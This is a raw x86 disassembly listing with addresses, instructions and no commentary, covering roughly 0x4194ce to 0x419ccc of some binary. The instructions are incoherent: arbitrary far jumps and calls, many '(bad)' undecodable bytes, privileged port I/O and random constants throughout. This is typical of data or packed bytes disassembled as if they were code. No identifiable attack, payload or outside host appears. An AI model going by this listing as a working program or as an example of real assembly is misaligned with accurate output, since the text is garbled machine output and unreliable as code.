  4194ce:	jmp    0x15ab:0x9edba038
  4194d5:	sub    al,0xc
  4194d7:	je     0x4194e6
  4194d9:	jmp    0x419497
  4194db:	cwde   
  4194dc:	dec    ebx
  4194dd:	or     BYTE PTR [ebp+0x2dd501e1],bh
  4194e3:	hlt    
  4194e4:	xchg   esi,eax
  4194e5:	es and eax,0x24570fd0
  4194eb:	pop    ecx
  4194ec:	mov    eax,0xcf95b68b
  4194f1:	jecxz  0x419504
  4194f3:	into   
  4194f4:	jecxz  0x41954a
  4194f6:	inc    edx
  4194f7:	loopne 0x4194ea
  4194f9:	sub    dh,ch
  4194fb:	call   0x85cd48f3
  419500:	and    ax,0x5607
  419504:	leave  
  419505:	rcr    BYTE PTR [ecx+0x33],0x33
  419509:	jmp    0x28c3:0xac6e95fb
  419510:	cs popa 
  419512:	rol    bl,1
  419514:	cmp    BYTE PTR ds:0x3198713f,bh
  41951a:	clc    
  41951b:	mov    WORD PTR [ebx-0x4d],ds
  41951e:	fld    QWORD PTR [edx+0x278d2915]
  419524:	jbe    0x4194f1
  419526:	mov    fs,ebx
  419528:	add    ecx,ebp
  41952a:	in     al,0x6a
  41952c:	dec    ecx
  41952d:	(bad)
  419530:	mov    eax,ds:0x4f7c1e8
  419535:	test   BYTE PTR cs:[esi-0x273c843b],al
  41953c:	inc    ebp
  41953d:	jbe    0x4194eb
  41953f:	call   0x7a4b:0xa287d3b4
  419546:	or     DWORD PTR [ebx-0x56fa63ce],ecx
  41954c:	jbe    0x419515
  41954e:	fiadd  DWORD PTR [esi+0xa]
  419551:	adc    ebp,DWORD PTR [eax]
  419553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419554:	jge    0x4195a1
  419556:	(bad)  
  419557:	stos   DWORD PTR es:[edi],eax
  419558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419559:	div    BYTE PTR [ebx-0x5e]
  41955c:	and    al,0xbb
  41955e:	ds push es
  419560:	inc    esp
  419561:	fwait
  419562:	sbb    al,0xb
  419564:	xchg   edx,eax
  419565:	jmp    0x419512
  419567:	out    0x4b,al
  419569:	mov    ah,0xaa
  41956b:	xor    BYTE PTR [eax+0x121270ff],bl
  419571:	or     al,0xed
  419573:	push   eax
  419574:	fmul   DWORD PTR [ebp+0xd]
  419577:	add    ecx,DWORD PTR [ebx+0xfa595bd]
  41957d:	xchg   edx,eax
  41957e:	pop    ebp
  41957f:	inc    eax
  419580:	jns    0x4195a6
  419582:	cmp    edx,DWORD PTR [edx-0x3e]
  419585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419586:	xchg   ecx,eax
  419587:	bswap  esi
  419589:	pop    edx
  41958a:	jo     0x419513
  41958c:	into   
  41958d:	stc    
  41958e:	adc    BYTE PTR [edx+esi*1],0x88
  419592:	data16 shl BYTE PTR [edi],1
  419595:	fiadd  DWORD PTR [ebx]
  419597:	or     ebp,edi
  419599:	mov    ecx,0xb785300a
  41959e:	jne    0x4195b5
  4195a0:	or     DWORD PTR [edi+0x7e],eax
  4195a3:	into   
  4195a4:	push   ss
  4195a5:	jg     0x41952b
  4195a7:	mov    esi,0x6d620fa3
  4195ac:	pop    ebp
  4195ad:	push   0x72beb09f
  4195b2:	mov    eax,ds:0x98bf29a9
  4195b7:	mov    ds:0x63bb57b2,eax
  4195bc:	scas   al,BYTE PTR es:[edi]
  4195bd:	mov    bh,0x9d
  4195bf:	and    DWORD PTR [esi+0x47],ebp
  4195c2:	push   ss
  4195c3:	push   ebx
  4195c4:	push   0xbf59fe1a
  4195c9:	or     eax,0x26f45ca0
  4195ce:	jbe    0x419601
  4195d0:	xor    cl,dl
  4195d2:	xor    BYTE PTR [edi-0x80d54b3],dh
  4195d8:	add    DWORD PTR [ecx+0x623782e0],ecx
  4195de:	enter  0xa27,0x7b
  4195e2:	out    dx,al
  4195e3:	jle    0x4195b9
  4195e5:	or     al,0xfe
  4195e7:	add    al,BYTE PTR [edi-0x12]
  4195ea:	add    BYTE PTR [ebx+0x7fc85900],dh
  4195f0:	aam    0x29
  4195f2:	cmp    BYTE PTR [ebp-0x11],ch
  4195f5:	xchg   DWORD PTR [ebx-0x6eecdfe7],esp
  4195fb:	lds    esi,FWORD PTR [ecx-0x7b72c3e8]
  419601:	ins    BYTE PTR es:[edi],dx
  419602:	div    DWORD PTR [ebp+0x6b40c4f4]
  419608:	mov    ecx,ebp
  41960a:	scas   eax,DWORD PTR es:[edi]
  41960b:	xchg   esi,eax
  41960c:	test   BYTE PTR [esi+0x592a72c4],ah
  419612:	in     eax,dx
  419613:	mov    ecx,0xea37029d
  419618:	sub    BYTE PTR [ecx+0x7bef779f],cl
  41961e:	push   edi
  41961f:	push   0x21
  419621:	ret    0x8481
  419624:	aad    0x30
  419626:	mov    al,0x1b
  419628:	mov    bh,dh
  41962a:	jle    0x4195f4
  41962c:	inc    eax
  41962d:	jg     0x4195f1
  41962f:	loope  0x419677
  419631:	sahf   
  419632:	(bad)  
  419633:	sbb    al,BYTE PTR [eax+0x9f8243d]
  419639:	adc    eax,0x3d790ac0
  41963e:	fldenv [ecx]
  419640:	pop    es
  419641:	pop    ds
  419642:	test   esp,ebx
  419644:	test   eax,0x6cfe99d0
  419649:	fisttp WORD PTR [eax]
  41964b:	mov    esi,0x8d6cad89
  419650:	repnz pop edi
  419652:	cmovne esi,DWORD PTR [esp+eiz*4-0x8]
  419657:	test   eax,0x1fd78b4b
  41965c:	leave  
  41965d:	cmp    BYTE PTR [ebx],dl
  41965f:	(bad)  
  419661:	mov    eax,0xbd50b9f
  419666:	xchg   eax,edx
  419668:	je     0x4196c7
  41966a:	push   es
  41966b:	xchg   al,bl
  41966d:	cs adc eax,0xd36a41a3
  419673:	adc    BYTE PTR [edx+eax*1+0x3b],cl
  419677:	(bad)  
  419678:	shr    esi,1
  41967a:	or     eax,edx
  41967c:	das    
  41967d:	not    DWORD PTR [ecx]
  41967f:	mov    ss,WORD PTR [edx-0x466dcf80]
  419685:	loope  0x4196a6
  419687:	js     0x4196bb
  419689:	rol    DWORD PTR [ecx-0x124c6537],1
  41968f:	inc    edi
  419690:	gs aas 
  419692:	fdivr  st,st(3)
  419694:	push   ss
  419695:	ja     0x4196c0
  419697:	inc    ebx
  419698:	loopne 0x4196cd
  41969a:	mov    ch,0x97
  41969c:	xor    BYTE PTR [esi-0x59],dl
  41969f:	scas   eax,DWORD PTR es:[edi]
  4196a0:	sar    BYTE PTR [edi],1
  4196a2:	inc    edi
  4196a3:	gs cmp eax,0x221b28df
  4196a9:	push   esp
  4196aa:	sub    BYTE PTR [ebx],ah
  4196ac:	dec    esi
  4196ad:	add    al,0x4a
  4196af:	shl    BYTE PTR [esp+esi*2],0x16
  4196b3:	add    BYTE PTR [edx-0x74],ah
  4196b6:	sbb    eax,0x4c18eb39
  4196bb:	cmp    eax,0xd26655a0
  4196c0:	inc    edi
  4196c1:	mov    edi,0x712e329b
  4196c6:	les    ecx,FWORD PTR [edi]
  4196c8:	cwde   
  4196c9:	ret    0xcb2d
  4196cc:	add    DWORD PTR ds:0xb84f697e,ebx
  4196d2:	push   ebx
  4196d3:	jmp    0x1572:0x8a86afa8
  4196da:	xchg   edx,eax
  4196db:	movups xmm1,xmm1
  4196de:	and    eax,0x11670ce1
  4196e3:	jbe    0x419690
  4196e5:	pop    ecx
  4196e6:	jnp    0x4196a4
  4196e8:	shr    DWORD PTR [ebx+0x135fa52c],1
  4196ee:	not    BYTE PTR [edi-0x300add9a]
  4196f4:	push   0xf13ba5c3
  4196f9:	pop    ss
  4196fa:	std    
  4196fb:	inc    eax
  4196fc:	loope  0x4196e0
  4196fe:	(bad)  
  4196ff:	or     ecx,edx
  419701:	xor    DWORD PTR [esi+ebp*2-0x4b],ecx
  419705:	xchg   ebp,eax
  419706:	add    eax,0xc1e2bfaf
  41970b:	mov    edx,0x345abe53
  419710:	add    DWORD PTR ss:0xc91493d3,eax
  419717:	jp     0x4196fc
  419719:	add    edi,DWORD PTR [esp+ebx*8+0x30fa77e7]
  419720:	imul   esi,DWORD PTR [edx-0x45],0x79
  419724:	pop    esp
  419725:	or     eax,0x4bffe69b
  41972a:	jmp    0x9961:0xfd0c9933
  419731:	mov    eax,0x78079f
  419736:	xchg   ebp,eax
  419737:	mov    dh,0x60
  419739:	call   0xad734867
  41973e:	mov    esp,0xbba65ffc
  419743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419744:	pop    ebp
  419745:	and    eax,0x835f64cd
  41974a:	out    dx,al
  41974b:	mov    esp,0x99f28a24
  419750:	pusha  
  419751:	jecxz  0x41978d
  419753:	cmp    eax,0x93fd9984
  419758:	xchg   BYTE PTR [ebx],bh
  41975a:	sar    dl,1
  41975c:	mov    edx,0x6136fc6c
  419761:	pop    ecx
  419762:	push   esp
  419763:	aaa    
  419764:	jecxz  0x4197b9
  419766:	stos   DWORD PTR es:[edi],eax
  419767:	sti    
  419768:	inc    edi
  419769:	add    DWORD PTR [esi-0x16],esi
  41976c:	mov    dl,0xaa
  41976e:	sub    eax,0xb0a0637d
  419773:	cmc    
  419774:	in     eax,dx
  419775:	pop    edx
  419776:	bound  edx,QWORD PTR [ecx-0x7f]
  419779:	pop    edi
  41977a:	retf   0xce47
  41977d:	inc    ebp
  41977e:	push   eax
  41977f:	cdq    
  419780:	xchg   esp,eax
  419781:	data16 mov bh,0x3e
  419784:	xchg   ebp,eax
  419785:	enter  0x9da8,0x19
  419789:	jns    0x4197ea
  41978b:	(bad)
  41978e:	mov    eax,ds:0x2db6676e
  419793:	es push es
  419795:	pop    ebx
  419796:	sahf   
  419797:	and    eax,0x66370d67
  41979c:	aam    0x53
  41979e:	mov    ebp,0x109e1eb5
  4197a3:	add    al,0x43
  4197a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197a6:	cdq    
  4197a7:	icebp  
  4197a8:	arpl   WORD PTR [edi+0x79e263c7],sp
  4197ae:	dec    esi
  4197af:	std    
  4197b0:	les    esi,FWORD PTR [ecx+0x10]
  4197b3:	into   
  4197b4:	dec    ecx
  4197b5:	loope  0x4197de
  4197b7:	dec    edx
  4197b8:	push   eax
  4197b9:	inc    esp
  4197ba:	dec    ecx
  4197bb:	imul   ebp,DWORD PTR [esi],0x18
  4197be:	jg     0x419835
  4197c0:	fwait
  4197c1:	cmp    ebx,DWORD PTR [edi]
  4197c3:	les    ebx,FWORD PTR [ecx+0xb]
  4197c6:	test   al,0x88
  4197c8:	outs   dx,DWORD PTR ds:[esi]
  4197c9:	hlt    
  4197ca:	stos   BYTE PTR es:[edi],al
  4197cb:	mov    DWORD PTR [ebx+edx*1],0xe72f37e2
  4197d2:	pop    ebx
  4197d3:	adc    BYTE PTR [ecx+0x7a],cl
  4197d6:	sub    al,0x30
  4197d8:	pop    eax
  4197d9:	or     dl,al
  4197db:	push   ebx
  4197dc:	and    al,0xe6
  4197de:	fnop   
  4197e0:	xchg   edx,eax
  4197e1:	and    BYTE PTR [eax],ah
  4197e3:	jnp    0x419842
  4197e5:	and    al,0xda
  4197e7:	fs push ebx
  4197e9:	(bad)  
  4197ea:	jns    0x4197a4
  4197ec:	mov    esi,0x1f848faa
  4197f1:	jge    0x4197a9
  4197f3:	adc    BYTE PTR [edx+eax*2],dh
  4197f6:	popf   
  4197f7:	jbe    0x4197fb
  4197f9:	and    bh,BYTE PTR [eax]
  4197fb:	sbb    al,0xaa
  4197fd:	and    DWORD PTR [ebx+0x1dff6591],0xd
  419804:	pop    ds
  419805:	ret    
  419806:	add    BYTE PTR [eax+ecx*2-0x5e],ch
  41980a:	popf   
  41980b:	repnz mov ds:0xd085100,al
  419811:	fmul   st,st(3)
  419813:	scas   al,BYTE PTR es:[edi]
  419814:	cwde   
  419815:	(bad)  
  419816:	mov    esi,0xee3b54e9
  41981b:	out    dx,eax
  41981c:	popa   
  41981d:	xchg   ebp,esp
  41981f:	adc    al,0x93
  419821:	rol    DWORD PTR [edx+0x59],1
  419824:	mov    bl,0xb6
  419826:	dec    ecx
  419827:	sbb    ecx,DWORD PTR [ebp-0x221ceaa2]
  41982d:	test   BYTE PTR [esi+0x36],0x98
  419831:	call   0xbedbb6c6
  419836:	fidivr DWORD PTR [eax-0x44]
  419839:	inc    esi
  41983a:	ror    BYTE PTR [ecx+edi*1-0x1e],cl
  41983e:	or     eax,0xdd691732
  419843:	daa    
  419844:	and    BYTE PTR [ebp+eiz*1+0x719ce83b],0x1d
  41984c:	nop
  41984d:	sub    esi,ecx
  41984f:	push   ebp
  419850:	out    0x6,al
  419852:	push   ds
  419853:	jg     0x4198b4
  419855:	adc    BYTE PTR [ecx],bh
  419857:	jmp    DWORD PTR [ebp+ecx*8-0x21]
  41985b:	imul   esi,DWORD PTR [ecx+0x12fccfe0],0x78
  419862:	(bad)  
  419864:	xlat   BYTE PTR ds:[ebx]
  419865:	cmp    eax,0x99e43023
  41986a:	outs   dx,BYTE PTR ds:[esi]
  41986b:	push   edi
  41986c:	cwde   
  41986d:	stc    
  41986e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41986f:	enter  0x71ca,0x77
  419873:	js     0x4198e6
  419875:	inc    eax
  419876:	sbb    al,BYTE PTR [ecx+0x135b885f]
  41987c:	push   ebp
  41987d:	repz push edi
  41987f:	or     BYTE PTR [edx+0x6d],0xfd
  419883:	lock pop es
  419885:	es sahf 
  419887:	xchg   esi,eax
  419888:	hlt    
  419889:	stos   DWORD PTR es:[edi],eax
  41988a:	clc    
  41988b:	enter  0x37cb,0x84
  41988f:	test   al,0x31
  419891:	lock cmp ebx,ebp
  419894:	xchg   ecx,eax
  419895:	rol    BYTE PTR ds:[ecx-0x66],0x1a
  41989a:	sbb    DWORD PTR ds:0x1420029e,esp
  4198a0:	mov    ds:0xe44a1381,al
  4198a5:	sbb    BYTE PTR [ecx+0x2885c798],ch
  4198ab:	aas    
  4198ac:	in     al,dx
  4198ad:	and    bh,BYTE PTR [ebp+0x27]
  4198b0:	mov    ah,0x4d
  4198b2:	fs loope 0x41992a
  4198b5:	cwde   
  4198b6:	adc    ecx,ecx
  4198b8:	cmp    eax,0xc98f12de
  4198bd:	pop    ss
  4198be:	or     DWORD PTR [esi+0x6a],esi
  4198c1:	and    BYTE PTR [edx+0x36],ch
  4198c4:	jge    0x41990a
  4198c6:	cld    
  4198c7:	dec    ebx
  4198c8:	pop    esp
  4198c9:	and    al,0x4e
  4198cb:	aam    0x81
  4198cd:	and    BYTE PTR [ecx+eiz*8],al
  4198d0:	stos   BYTE PTR es:[edi],al
  4198d1:	jg     0x419896
  4198d3:	mov    edi,0x620a7209
  4198d8:	jecxz  0x419879
  4198da:	ins    DWORD PTR es:[edi],dx
  4198db:	xor    esi,DWORD PTR [ebp+esi*1+0x60]
  4198df:	dec    ebx
  4198e0:	mov    ch,0x19
  4198e2:	xlat   BYTE PTR ds:[ebx]
  4198e3:	inc    edi
  4198e4:	fstp   TBYTE PTR [eax-0x28]
  4198e7:	inc    eax
  4198e8:	call   0x98d5:0x36624ff0
  4198ef:	mov    dh,0x14
  4198f1:	imul   eax,DWORD PTR [esi],0x98bf8e82
  4198f7:	jg     0x419887
  4198f9:	mov    al,0x6f
  4198fb:	mov    al,ds:0x439c87d6
  419900:	std    
  419901:	icebp  
  419902:	in     eax,0x6c
  419904:	cwde   
  419905:	adc    DWORD PTR [ebx-0x332acf2f],ebx
  41990b:	retf   0x1100
  41990e:	sub    al,0xef
  419910:	and    eax,0x61c2efe8
  419915:	inc    ebp
  419916:	imul   esp,DWORD PTR [edx+0x30],0xe
  41991a:	inc    esi
  41991b:	loopne 0x4198fb
  41991d:	imul   dl
  41991f:	(bad)  
  419920:	mov    al,0xaa
  419922:	ds sbb ah,al
  419925:	inc    ecx
  419926:	mov    edi,edx
  419928:	fst    DWORD PTR [edx+0x42]
  41992b:	or     ebx,DWORD PTR [ecx+0x16179444]
  419931:	shl    BYTE PTR [edx+ebp*8],cl
  419934:	jmp    0x4198be
  419936:	test   esp,ebp
  419938:	dec    ebp
  419939:	inc    ebp
  41993a:	xchg   esp,eax
  41993b:	inc    esi
  41993c:	test   ch,0x7a
  41993f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419940:	push   esp
  419941:	jae    0x4199b4
  419943:	xchg   BYTE PTR [ebx],bl
  419945:	pop    es
  419946:	xor    al,0x91
  419948:	sbb    eax,0xeed50a46
  41994d:	mov    ds:0x72f64690,al
  419952:	xchg   ebx,eax
  419953:	xor    cl,bh
  419955:	aad    0xa7
  419957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419958:	or     al,0xbb
  41995a:	jmp    0x9a783049
  41995f:	lods   al,BYTE PTR ds:[esi]
  419960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419961:	fistp  QWORD PTR [ecx+0x3add8928]
  419967:	jae    0x419925
  419969:	fwait
  41996a:	lock sub eax,0xa8aabaae
  419970:	mov    ecx,0x49df3d02
  419975:	out    dx,eax
  419976:	sbb    DWORD PTR [ecx+0x6c],ebx
  419979:	rcl    DWORD PTR ds:0xcaccefc8,0xf3
  419980:	adc    al,0xfd
  419982:	fstp   DWORD PTR [eax+0x7616c76f]
  419988:	and    ebx,esi
  41998a:	mov    ds:0x74f48f56,eax
  41998f:	(bad)  
  419990:	ins    DWORD PTR es:[edi],dx
  419991:	repnz mov ecx,0x81a5aeb5
  419997:	pop    edx
  419998:	aaa    
  419999:	push   ebp
  41999a:	mov    ebx,DWORD PTR [esi-0x1211fb52]
  4199a0:	rol    edx,cl
  4199a2:	mov    eax,0x933a9a7b
  4199a7:	(bad)
  4199ac:	repnz dec ebp
  4199ae:	mov    dh,0xec
  4199b0:	dec    ecx
  4199b1:	mov    bh,0x86
  4199b3:	dec    esp
  4199b4:	and    BYTE PTR [esi],ah
  4199b6:	and    bh,cl
  4199b8:	sub    al,0x86
  4199ba:	les    edx,FWORD PTR [esi-0x3e]
  4199bd:	jle    0x4199a3
  4199bf:	ds (bad) 
  4199c2:	adc    eax,0x704ea821
  4199c7:	jbe    0xae79af76
  4199cd:	je     0x419969
  4199cf:	mov    DWORD PTR [ebp+0x4a],ebx
  4199d2:	sbb    dl,bh
  4199d4:	xchg   ecx,eax
  4199d5:	push   esp
  4199d6:	jno    0x419958
  4199d8:	inc    ebp
  4199d9:	call   0xf4121b0a
  4199de:	popf   
  4199df:	rcr    DWORD PTR [ebp+edi*2-0x67231fe7],1
  4199e6:	mov    dh,0xb
  4199e8:	mov    ds,esi
  4199ea:	push   ds
  4199eb:	xchg   DWORD PTR [edx-0x7f],ecx
  4199ee:	xor    al,0x18
  4199f0:	fbstp  TBYTE PTR [esi+edi*4]
  4199f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199f4:	out    0x22,al
  4199f6:	imul   edi,DWORD PTR [edi],0xaf006e27
  4199fc:	sbb    al,0x97
  4199fe:	and    eax,eax
  419a00:	scas   eax,DWORD PTR es:[edi]
  419a01:	test   BYTE PTR ds:0x634435a6,al
  419a07:	(bad)  
  419a08:	dec    edx
  419a09:	jmp    0xf560fdb
  419a0e:	iret   
  419a0f:	in     eax,dx
  419a10:	repz push esi
  419a12:	loope  0x419a0e
  419a14:	dec    eax
  419a15:	in     al,dx
  419a16:	cmp    BYTE PTR [edx],ch
  419a18:	dec    ebp
  419a19:	outs   dx,DWORD PTR ds:[esi]
  419a1a:	sub    eax,0x16d7b819
  419a1f:	scas   al,BYTE PTR es:[edi]
  419a20:	xor    DWORD PTR ds:0xa961,ebx
  419a25:	pop    ss
  419a26:	push   ds
  419a27:	cmc    
  419a28:	inc    eax
  419a29:	sub    al,0x42
  419a2b:	sbb    BYTE PTR [eax],0x27
  419a2e:	loope  0x419a52
  419a30:	mov    ecx,0xddb80c84
  419a35:	or     ebx,DWORD PTR [esi]
  419a37:	sub    DWORD PTR [edi-0x4e],edx
  419a3a:	xchg   edx,eax
  419a3b:	aaa    
  419a3c:	jno    0x4199de
  419a3e:	fdiv   st(4),st
  419a40:	in     eax,0x21
  419a42:	lea    esi,[edx+0x1a18fd03]
  419a48:	mov    BYTE PTR ss:[edi-0x351d5449],dl
  419a4f:	sub    DWORD PTR [esi-0x17],eax
  419a52:	push   esp
  419a53:	popf   
  419a54:	push   DWORD PTR [eax]
  419a56:	dec    ecx
  419a57:	outs   dx,DWORD PTR ds:[esi]
  419a58:	sub    bl,cl
  419a5a:	or     BYTE PTR [esi-0x6623dacd],0x85
  419a61:	lds    ecx,FWORD PTR [ecx+0x12]
  419a64:	lock mov ecx,0x97dd3e3d
  419a6a:	inc    edi
  419a6b:	cmp    ah,dl
  419a6d:	pop    ecx
  419a6e:	rcl    BYTE PTR [edi],0xbd
  419a71:	stc    
  419a72:	stos   DWORD PTR es:[edi],eax
  419a73:	fsub   QWORD PTR [edi]
  419a75:	imul   ebp,DWORD PTR [ebx-0x37181cdf],0xe94d7435
  419a7f:	jecxz  0x419a8a
  419a81:	pop    ss
  419a82:	xchg   ch,ah
  419a84:	test   eax,0x759932bb
  419a89:	cdq    
  419a8a:	pushfw 
  419a8c:	dec    BYTE PTR [ecx-0x6b]
  419a8f:	and    al,0x43
  419a91:	hlt    
  419a92:	jnp    0x419aeb
  419a94:	cmp    BYTE PTR [edx],dh
  419a96:	iret   
  419a97:	out    dx,al
  419a98:	jge    0x419a60
  419a9a:	(bad)  
  419a9b:	cmp    eax,0xab3f60ac
  419aa0:	aad    0xcb
  419aa2:	pushf  
  419aa3:	push   cs
  419aa4:	jle    0x419a41
  419aa6:	imul   BYTE PTR [esi*2-0xb4c440e]
  419aad:	sahf   
  419aae:	jae    0x419ac7
  419ab0:	push   edx
  419ab1:	dec    esi
  419ab2:	mov    DWORD PTR [edx-0x37],ebp
  419ab5:	sar    BYTE PTR [ebx+0x78],1
  419ab8:	in     al,dx
  419ab9:	cmc    
  419aba:	(bad)  
  419abb:	dec    ecx
  419abc:	push   edi
  419abd:	mov    cl,0x98
  419abf:	imul   ebp,edi,0x58e28274
  419ac5:	xchg   DWORD PTR [esi],ebp
  419ac7:	sub    al,0x59
  419ac9:	mov    esi,0xc19084f2
  419ace:	mov    al,0xc1
  419ad0:	xchg   ebx,eax
  419ad1:	mov    DWORD PTR [edi-0x634e6647],ebp
  419ad7:	dec    eax
  419ad8:	data16 mov ?,WORD PTR [eax-0x506fdeb3]
  419adf:	int3   
  419ae0:	scas   ax,WORD PTR es:[edi]
  419ae2:	mov    esi,0x19656834
  419ae7:	into   
  419ae8:	inc    eax
  419ae9:	test   DWORD PTR [ecx-0x250e5e52],edx
  419aef:	popf   
  419af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af1:	cmp    DWORD PTR [ebx+edx*2],ebx
  419af4:	pop    ss
  419af5:	gs imul eax,edi,0xffffffc5
  419af9:	or     edx,esp
  419afb:	fnstenv [edx]
  419afd:	(bad)  
  419afe:	jecxz  0x419b77
  419b00:	sub    ah,cl
  419b02:	(bad)  
  419b03:	rol    bh,1
  419b05:	or     edx,DWORD PTR [edi]
  419b07:	pop    esp
  419b08:	or     al,0xd0
  419b0a:	addr16 std 
  419b0c:	dec    ebp
  419b0d:	cmp    eax,0xfe68b353
  419b12:	dec    ebx
  419b13:	push   ebx
  419b14:	neg    BYTE PTR [ebp-0x951326a]
  419b1a:	cmp    edx,DWORD PTR [esi]
  419b1c:	cmp    ebx,DWORD PTR [edi+0xd]
  419b1f:	sub    DWORD PTR [esi+ebp*2+0x7f],edi
  419b23:	imul   BYTE PTR [edx+0x4da2d773]
  419b29:	inc    esp
  419b2a:	mov    eax,ds:0x5b3067c9
  419b2f:	mov    eax,0x2ba83934
  419b34:	pop    esi
  419b35:	es adc al,0xca
  419b38:	or     eax,0x7ee23e67
  419b3d:	int    0xa8
  419b3f:	mov    ebp,0xd2bdd9ce
  419b44:	scas   eax,DWORD PTR es:[edi]
  419b45:	and    DWORD PTR [esi],eax
  419b47:	xchg   esp,eax
  419b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b49:	sbb    al,ch
  419b4b:	xchg   esp,eax
  419b4c:	push   0x43c66927
  419b51:	repz jmp 0x32:0x47203ee9
  419b59:	outs   dx,BYTE PTR cs:[si]
  419b5c:	jns    0x419b10
  419b5e:	aas    
  419b5f:	pop    es
  419b60:	int    0xbd
  419b62:	inc    esp
  419b63:	je     0x419b9c
  419b65:	jnp    0x419b32
  419b67:	xor    dh,ch
  419b69:	xor    DWORD PTR [edx+0x2f],0x415b6747
  419b70:	cdq    
  419b71:	pop    es
  419b72:	mov    es,esi
  419b74:	mov    BYTE PTR [ecx-0x6291c145],al
  419b7a:	xchg   BYTE PTR [ebx],dh
  419b7c:	test   BYTE PTR [ebx],bh
  419b7e:	je     0x419bca
  419b80:	clc    
  419b81:	dec    edx
  419b82:	fisub  DWORD PTR [eax]
  419b84:	sahf   
  419b85:	pusha  
  419b86:	repnz fidivr DWORD PTR [edi-0xd]
  419b8a:	repnz mov dh,BYTE PTR [edi-0x24]
  419b8e:	push   ebp
  419b8f:	add    eax,0x77700a43
  419b94:	bound  edx,QWORD PTR [ecx-0x5e2e703]
  419b9a:	cmp    DWORD PTR [esp+ecx*1-0x62143088],edi
  419ba1:	push   ebx
  419ba2:	or     edx,DWORD PTR [edx+ebp*1+0x510b68a2]
  419ba9:	jae    0x419ba0
  419bab:	icebp  
  419bac:	call   0xa1450c6e
  419bb1:	inc    ebp
  419bb2:	lea    ecx,[esi+ecx*8+0x1]
  419bb6:	jge    0x419b86
  419bb8:	in     al,0x68
  419bba:	cmp    BYTE PTR [eax],ah
  419bbc:	jg     0x419b92
  419bbe:	idiv   ebx
  419bc0:	std    
  419bc1:	fcomp  DWORD PTR [eax+0x42]
  419bc4:	jmp    0x7316676d
  419bc9:	mov    ds:0xc0a0c19a,eax
  419bce:	adc    dh,ah
  419bd0:	fidivr DWORD PTR [esi+eax*1-0x4c]
  419bd4:	aas    
  419bd5:	pop    ebx
  419bd6:	aam    0x2
  419bd8:	lods   al,BYTE PTR ds:[esi]
  419bd9:	ja     0x419b82
  419bdb:	jmp    0x419b97
  419bdd:	nop
  419bde:	xchg   ebx,eax
  419bdf:	xor    eax,0x5fc32699
  419be4:	mov    bl,0x26
  419be6:	ror    BYTE PTR [ebx-0x29],0x78
  419bea:	add    dh,bh
  419bec:	rcl    BYTE PTR [edx+ebx*4],cl
  419bef:	xlat   BYTE PTR ds:[ebx]
  419bf0:	leave  
  419bf1:	mov    DWORD PTR [esi-0x25],ebp
  419bf4:	fistp  DWORD PTR [ebx]
  419bf6:	xchg   esi,eax
  419bf7:	test   eax,0xb008b58b
  419bfc:	xor    edx,DWORD PTR [eax+ecx*2]
  419bff:	adc    eax,0x10ce9320
  419c04:	sbb    eax,0xaf83c317
  419c09:	pop    edx
  419c0a:	imul   eax,ecx,0x99ba690e
  419c10:	sar    ch,0xb4
  419c13:	mov    eax,0x4504ce6
  419c18:	enter  0x9d8,0xb3
  419c1c:	ds out 0x2d,eax
  419c1f:	xor    BYTE PTR [eax-0x1a],ah
  419c22:	cmc    
  419c23:	sbb    ebp,edx
  419c25:	push   cs
  419c26:	sub    dh,BYTE PTR [edx]
  419c28:	jg     0x419c74
  419c2a:	sub    BYTE PTR [ebx-0x574fb8e6],bl
  419c30:	push   edx
  419c31:	push   ecx
  419c32:	push   0x38
  419c34:	or     ah,ch
  419c36:	pop    edx
  419c37:	xor    bh,BYTE PTR [esi]
  419c39:	mov    eax,ds:0x31741387
  419c3e:	jb     0x419c92
  419c40:	inc    ebx
  419c41:	cld    
  419c42:	mov    dh,0x2a
  419c44:	les    eax,FWORD PTR [ecx]
  419c46:	mov    ds:0xf87e451c,al
  419c4b:	jge    0x419cad
  419c4d:	lahf   
  419c4e:	cmp    DWORD PTR ss:[edx+0x5333abde],eax
  419c55:	and    al,BYTE PTR [esi]
  419c57:	inc    esp
  419c58:	outs   dx,BYTE PTR ds:[esi]
  419c59:	rcl    BYTE PTR [ecx-0x49b63324],0x3b
  419c60:	push   0xc1d2e63d
  419c65:	sahf   
  419c66:	in     eax,dx
  419c67:	lods   al,BYTE PTR ds:[esi]
  419c68:	pop    eax
  419c69:	lahf   
  419c6a:	fst    DWORD PTR [ebx]
  419c6c:	fisttp DWORD PTR [eax+0x720d2be0]
  419c72:	xor    ecx,DWORD PTR [edi+ebx*1]
  419c75:	sbb    dh,BYTE PTR [ebp+eiz*2+0x43]
  419c79:	ja     0x44bf51e3
  419c7f:	mov    esp,0x9ebf330d
  419c84:	js     0x419c14
  419c86:	imul   eax,DWORD PTR [edx-0x70],0x66f85867
  419c8d:	aad    0x9f
  419c8f:	(bad)  
  419c90:	fsubp  st(4),st
  419c92:	mov    BYTE PTR [ecx+0x3b321b8d],ah
  419c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c99:	adc    bh,dl
  419c9b:	sti    
  419c9c:	es enter 0xe25f,0x99
  419ca1:	(bad)  
  419ca2:	xor    edi,edx
  419ca4:	sbb    BYTE PTR [eax+0x50e367c5],ah
  419caa:	data16 lock jbe 0x419c9b
  419cae:	pop    ecx
  419caf:	add    edi,ecx
  419cb1:	loop   0x419c36
  419cb3:	nop
  419cb4:	aas    
  419cb5:	out    dx,al
  419cb6:	xchg   ecx,eax
  419cb7:	inc    edx
  419cb8:	cwde   
  419cb9:	push   cs
  419cba:	sbb    al,0xde
  419cbc:	xchg   eax,ebp
  419cbe:	(bad)  
  419cbf:	dec    esp
  419cc0:	push   ecx
  419cc1:	(bad)  
  419cc2:	aas    
  419cc3:	mov    dh,0xeb
  419cc5:	mov    edx,0xdc730f66
  419cca:	inc    esi
  419ccb:	pop    es
  419ccc:	adc    al,0xb5
